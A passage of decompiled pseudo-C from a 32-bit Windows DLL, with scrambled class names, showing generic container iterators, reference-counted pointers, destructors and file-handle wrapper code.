  sub_10016837(a2, (int)this);
  return this;
}

//----- (100163A8) --------------------------------------------------------
void *__thiscall sub_100163A8(void *this, int a2)
{
  sub_10016837(a2, (int)this);
  return this;
}

//----- (100163BD) --------------------------------------------------------
int __thiscall sub_100163BD(_DWORD *this)
{
  return this[3];
}

//----- (100163C1) --------------------------------------------------------
_DWORD *__thiscall sub_100163C1(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_100168F9(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10016DE9(a2, (int)v4);
  return a2;
}

//----- (10016417) --------------------------------------------------------
_DWORD *__thiscall sub_10016417(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10016AED(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10016E56(a2, (int)v4);
  return a2;
}

//----- (1001646D) --------------------------------------------------------
_DWORD *__thiscall sub_1001646D(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_100168F9(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10016DE9(a2, (int)v4);
  return a2;
}

//----- (100164C3) --------------------------------------------------------
_DWORD *__thiscall sub_100164C3(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10016AED(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10016E56(a2, (int)v4);
  return a2;
}

//----- (10016519) --------------------------------------------------------
void __thiscall sub_10016519(_DWORD *this)
{
  *this = &off_10073B60;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073B60: using guessed type int (__thiscall *off_10073B60)(void *Block, char);

//----- (1001653E) --------------------------------------------------------
int *__thiscall sub_1001653E(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10016746(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10016594: variable 'v5' is possibly undefined

//----- (100165A6) --------------------------------------------------------
int *__thiscall sub_100165A6(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100168C8(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100165FC: variable 'v5' is possibly undefined

//----- (1001660E) --------------------------------------------------------
void __thiscall sub_1001660E(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10003DDA(v3);
}

//----- (10016649) --------------------------------------------------------
void __thiscall sub_10016649(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10003DDA(v2);
}

//----- (10016681) --------------------------------------------------------
int __thiscall sub_10016681(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10016E95(v4);
  return v2;
}

//----- (100166BD) --------------------------------------------------------
int __thiscall sub_100166BD(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10003DDA(v4);
  return v2;
}

//----- (100166F9) --------------------------------------------------------
void __thiscall sub_100166F9(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10003DDA(v1);
}

//----- (10016746) --------------------------------------------------------
int __usercall sub_10016746@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1001677E) --------------------------------------------------------
_DWORD *__thiscall sub_1001677E(_DWORD *Block, char a2)
{
  sub_1001633C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001679D) --------------------------------------------------------
void *__stdcall sub_1001679D(void *Block)
{
  sub_10016817((int)Block);
  j__free(Block);
  return Block;
}

//----- (100167B8) --------------------------------------------------------
_DWORD *__thiscall sub_100167B8(_DWORD *Block, char a2)
{
  sub_10016519(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100167D7) --------------------------------------------------------
_DWORD *__thiscall sub_100167D7(_DWORD *Block, char a2)
{
  *Block = &off_10073B98;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073B98: using guessed type int (__thiscall *off_10073B98)(void *Block, char);

//----- (100167F7) --------------------------------------------------------
_DWORD *__thiscall sub_100167F7(_DWORD *Block, char a2)
{
  *Block = &off_10073BB8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073BB8: using guessed type int (__thiscall *off_10073BB8)(void *Block, char);

//----- (10016817) --------------------------------------------------------
int __stdcall sub_10016817(int a1)
{
  return sub_10003DA1();
}

//----- (10016837) --------------------------------------------------------
void __usercall sub_10016837(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_100168C8(v4, v5[0]);
  }
  v6 = -1;
  sub_10016E95(v5);
}
// 10016870: variable 'v4' is possibly undefined

//----- (10016893) --------------------------------------------------------
_DWORD *__stdcall sub_10016893(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10073B60;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073B60: using guessed type int (__thiscall *off_10073B60)(void *Block, char);

//----- (100168C8) --------------------------------------------------------
int __usercall sub_100168C8@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100168F9) --------------------------------------------------------
_DWORD *__thiscall sub_100168F9(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073B98;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073BD8;
  a2[3] = a3;
  return result;
}
// 10073B98: using guessed type int (__thiscall *off_10073B98)(void *Block, char);
// 10073BD8: using guessed type int (__thiscall *off_10073BD8)(void *Block, char);

//----- (10016933) --------------------------------------------------------
void __thiscall sub_10016933(_DWORD *this)
{
  *this = &off_10073BD8;
  *this = &off_10073B98;
}
// 10073B98: using guessed type int (__thiscall *off_10073B98)(void *Block, char);
// 10073BD8: using guessed type int (__thiscall *off_10073BD8)(void *Block, char);

//----- (10016958) --------------------------------------------------------
BOOL __thiscall sub_10016958(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10016961) --------------------------------------------------------
BOOL __thiscall sub_10016961(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001696A) --------------------------------------------------------
int __thiscall sub_1001696A(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1001698E) --------------------------------------------------------
int __thiscall sub_1001698E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (100169BB) --------------------------------------------------------
int __thiscall sub_100169BB(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (100169E8) --------------------------------------------------------
void *__thiscall sub_100169E8(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 8);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 8) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_1001679D(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10016A5E) --------------------------------------------------------
_DWORD *__thiscall sub_10016A5E(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  _DWORD *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-34h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-30h]
  int v11; // [esp-8h] [ebp-2Ch]
  volatile LONG *v12; // [esp-4h] [ebp-28h]
  int *v13; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_10016D34(Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10016AED) --------------------------------------------------------
_DWORD *__thiscall sub_10016AED(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073BB8;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073BF8;
  a2[3] = a3;
  return result;
}
// 10073BB8: using guessed type int (__thiscall *off_10073BB8)(void *Block, char);
// 10073BF8: using guessed type int (__thiscall *off_10073BF8)(void *Block, char);

//----- (10016B27) --------------------------------------------------------
void __thiscall sub_10016B27(_DWORD *this)
{
  *this = &off_10073BF8;
  *this = &off_10073BB8;
}
// 10073BB8: using guessed type int (__thiscall *off_10073BB8)(void *Block, char);
// 10073BF8: using guessed type int (__thiscall *off_10073BF8)(void *Block, char);

//----- (10016B4C) --------------------------------------------------------
BOOL __thiscall sub_10016B4C(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10016B55) --------------------------------------------------------
BOOL __thiscall sub_10016B55(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10016B5E) --------------------------------------------------------
int __thiscall sub_10016B5E(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10016B82) --------------------------------------------------------
int __thiscall sub_10016B82(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (10016BAF) --------------------------------------------------------
int __thiscall sub_10016BAF(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (10016BDC) --------------------------------------------------------
void *__thiscall sub_10016BDC(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 8);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 8) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_1001679D(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10016C52) --------------------------------------------------------
_DWORD *__thiscall sub_10016C52(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  _DWORD *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-34h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-30h]
  int v11; // [esp-8h] [ebp-2Ch]
  volatile LONG *v12; // [esp-4h] [ebp-28h]
  int *v13; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_10016D34(Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10016CE1) --------------------------------------------------------
_DWORD *__thiscall sub_10016CE1(_DWORD *Block, char a2)
{
  sub_10016933(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016D00) --------------------------------------------------------
_DWORD *__thiscall sub_10016D00(_DWORD *Block, char a2)
{
  sub_10016B27(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016D34) --------------------------------------------------------
_DWORD *__stdcall sub_10016D34(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  a1[1] = lpAddend;
  *a1 = a2;
  InterlockedIncrement(lpAddend);
  a1[2] = a4;
  a1[3] = a5;
  sub_10003DA1();
  return a1;
}

//----- (10016D87) --------------------------------------------------------
_DWORD *__userpurge sub_10016D87@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_10011C8D(a2);
  *a2 = &off_10073638;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10011904(a2, v2, v4, v5);
  return a2;
}
// 10073638: using guessed type int (__thiscall *off_10073638)(void *Block, char);

//----- (10016DE9) --------------------------------------------------------
_DWORD *__userpurge sub_10016DE9@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10016E56) --------------------------------------------------------
_DWORD *__userpurge sub_10016E56@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10016E95) --------------------------------------------------------
void __thiscall sub_10016E95(void *this)
{
  sub_10016EFC((int)this);
}

//----- (10016EFC) --------------------------------------------------------
void __usercall sub_10016EFC(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10016F42) --------------------------------------------------------
void __thiscall __noreturn sub_10016F42(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_1000E072(&pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVGfnpwoMadjdwvkl_sr__);
}

//----- (10016F8F) --------------------------------------------------------
_DWORD *__usercall sub_10016F8F@<eax>(_DWORD *a1@<esi>)
{
  *a1 = &off_10073C18;
  a1[1] = _set_new_handler((int (__cdecl *)(unsigned int))sub_10016F42);
  a1[2] = _set_new_mode(1);
  return a1;
}
// 10073C18: using guessed type int (__thiscall *off_10073C18)(void *Block, char);

//----- (10016FB1) --------------------------------------------------------
void *__thiscall sub_10016FB1(void *Block, char a2)
{
  sub_10016FD0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016FD0) --------------------------------------------------------
int __thiscall sub_10016FD0(void *this)
{
  *(_DWORD *)this = &off_10073C18;
  _set_new_handler(*((int (__cdecl **)(unsigned int))this + 1));
  return _set_new_mode(*((_DWORD *)this + 2));
}
// 10073C18: using guessed type int (__thiscall *off_10073C18)(void *Block, char);

//----- (1001700E) --------------------------------------------------------
int __stdcall sub_1001700E(int a1, int a2, _DWORD *a3, int a4, int a5, int a6, volatile LONG *lpAddend)
{
  int v8; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v9; // [esp+4h] [ebp-24h]
  int *v10; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v11 = 0;
  v10 = &v8;
  v9 = lpAddend;
  v8 = a6;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 0;
  sub_10017C15(3, -1073741824, (_DWORD *)a1, a2, 128, a5, v8, v9);
  LOBYTE(v11) = 2;
  *(_DWORD *)a1 = &off_10073C50;
  *(_DWORD *)(a1 + 40) = *a3;
  *(_DWORD *)(a1 + 44) = a3[1];
  *(_DWORD *)(a1 + 48) = a4;
  *(_BYTE *)(a1 + 52) = 0;
  v11 = -1;
  sub_10003D24(&a6);
  return a1;
}
// 10073C50: using guessed type int (__thiscall *off_10073C50)(void *Block, char);

//----- (10017093) --------------------------------------------------------
HANDLE *__thiscall sub_10017093(HANDLE *Block, char a2)
{
  sub_100171E7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100170B2) --------------------------------------------------------
int __stdcall sub_100170B2(int a1, int a2, _DWORD *a3, int a4, volatile LONG *lpAddend)
{
  int v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = &v6;
  v7 = lpAddend;
  v6 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_10017C15(-1, 256, (_DWORD *)a1, a2, 128, 3, v6, v7);
  LOBYTE(v9) = 2;
  *(_DWORD *)a1 = &off_10073C50;
  *(_DWORD *)(a1 + 40) = *a3;
  *(_DWORD *)(a1 + 44) = a3[1];
  *(_DWORD *)(a1 + 48) = 1;
  *(_BYTE *)(a1 + 52) = 0;
  v9 = -1;
  sub_10003D24(&a4);
  return a1;
}
// 10073C50: using guessed type int (__thiscall *off_10073C50)(void *Block, char);

//----- (10017136) --------------------------------------------------------
int __userpurge sub_10017136@<eax>(int a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend)
{
  int v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = &v6;
  v7 = lpAddend;
  v6 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_10017C15(-1, a1, (_DWORD *)a2, a3, 128, 3, v6, v7);
  *(_DWORD *)a2 = &off_10073C50;
  *(_BYTE *)(a2 + 52) = 1;
  v9 = -1;
  sub_10003D24(&a4);
  return a2;
}
// 10073C50: using guessed type int (__thiscall *off_10073C50)(void *Block, char);

//----- (100171A0) --------------------------------------------------------
int __thiscall sub_100171A0(int this, int a2)
{
  sub_10017CF5((_DWORD *)this, (_DWORD *)a2);
  *(_DWORD *)a2 = &off_10073C50;
  *(_DWORD *)(a2 + 40) = *(_DWORD *)(this + 40);
  *(_DWORD *)(a2 + 44) = *(_DWORD *)(this + 44);
  *(_DWORD *)(a2 + 48) = *(_DWORD *)(this + 48);
  *(_BYTE *)(a2 + 52) = *(_BYTE *)(this + 52);
  return a2;
}
// 10073C50: using guessed type int (__thiscall *off_10073C50)(void *Block, char);

//----- (100171E7) --------------------------------------------------------
void __thiscall sub_100171E7(HANDLE *this)
{
  *this = &off_10073C50;
  sub_10017574(this);
  sub_10017D5E((int)this);
}
// 10073C50: using guessed type int (__thiscall *off_10073C50)(void *Block, char);

//----- (10017229) --------------------------------------------------------
void __thiscall sub_10017229(void *this)
{
  int v2; // eax
  _DWORD *v3; // esi
  int v4; // eax
  volatile LONG *v5; // ecx
  volatile LONG *v6; // ecx
  volatile LONG *v7; // [esp-14h] [ebp-98h] BYREF
  volatile LONG *v8; // [esp-10h] [ebp-94h]
  volatile LONG *v9; // [esp-Ch] [ebp-90h] BYREF
  volatile LONG *v10; // [esp-8h] [ebp-8Ch]
  int v11[10]; // [esp+10h] [ebp-74h] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-4Ch] BYREF
  struct _FILETIME v13; // [esp+48h] [ebp-3Ch] BYREF
  int v14[2]; // [esp+50h] [ebp-34h] BYREF
  int v15[2]; // [esp+58h] [ebp-2Ch] BYREF
  FILETIME v16; // [esp+60h] [ebp-24h] BYREF
  __int64 v17; // [esp+68h] [ebp-1Ch] BYREF
  bool v18; // [esp+73h] [ebp-11h]
  int v19; // [esp+80h] [ebp-4h]

  HIDWORD(v17) = this;
  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 12))(this) )
  {
    v18 = !sub_1001A327((int)this + 8);
    v16.dwLowDateTime = 0;
    v16.dwHighDateTime = 0;
    (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 24))(this, v14);
    v19 = 0;
    v2 = sub_1000A996((int)v14, 0x5Cu);
    sub_1000A3E9((int)v14, 0, v15, v2 + 1);
    LOBYTE(v19) = 1;
    v3 = (_DWORD *)HIDWORD(v17);
    if ( v18 )
    {
      if ( *(_BYTE *)(HIDWORD(v17) + 52) )
      {
        sub_1002D3CB(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
      }
      *(_DWORD *)(HIDWORD(v17) + 56) = *(_DWORD *)(HIDWORD(v17) + 40);
      v3[15] = v3[11];
      v4 = v3[12];
      v3[16] = v4;
      v3[17] = v3[10];
      v5 = (volatile LONG *)v3[11];
      v3[18] = v5;
      v3[19] = v4;
      v10 = v5;
      v9 = v5;
      HIDWORD(v17) = &v9;
      sub_10018B3B(&v9);
      LOBYTE(v19) = 1;
      sub_10017C15(7, 0x80000000, v11, (int)v15, 0x2000000, 3, (int)v9, v10);
      LOBYTE(v19) = 3;
      sub_10017DBD(v11);
      v16 = (FILETIME)*sub_10018172((HANDLE *)v11, &v17, 1);
      LOBYTE(v19) = 1;
      sub_10017D5E((int)v11);
    }
    else
    {
      sub_1001847C(
        (struct _FILETIME *)(HIDWORD(v17) + 68),
